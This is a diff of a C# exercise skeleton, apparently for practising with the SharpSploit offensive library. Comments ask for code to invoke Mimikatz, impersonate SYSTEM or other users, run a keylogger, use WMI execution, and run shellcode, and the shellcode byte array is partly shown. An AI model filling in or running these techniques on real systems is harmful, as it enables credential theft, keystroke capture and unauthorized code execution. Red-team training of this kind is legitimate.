@@ -7,28 +7,40 @@ public class Program {
     public static void Main() {
     }
 
+    // Write the code necessary to invoke mimikatz from SharpSploit!
     public static void InvokeMimikatz() {
-
+        Console.WriteLine("I'm invoking Mimikatz using SharpSploit!");
     }
 
+    // Write the code necessary to identify the current user
     public static void InvokeWhoAmI() {
-
+        Console.WriteLine("I'm invoking WhoAmI using SharpSploit!");
     }
 
+    // Write the code necessary to impersonate system and then print WhoAmI()
     public static void InvokeWhoAmIAfterImpersonatingSystem() {
 
     }
 
+    // Write the code necessary to impersonate another user and then print WhoAmI()
+    public static void InvokeWhoAmIAsImpersonatedUser() {
+
+    }
+
+    // Write the code necessary to start the keylogger and then print out
+    // the logged key strokes.
     public static void InvokeKeylogger() {
 
     }
 
+    // Write the code necessary to start a process using WMIExecute.
     public static void InvokeWMIExecute() {
         // In WMI, "." represents the local computer.
         var computerName = ".";
 
     }
 
+    // Write the code necessary to execute the shellcode provided using ShellCodeExecute.
     public static void InvokeShellCode() {
         byte[] shellcode = new byte[193] {
             0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
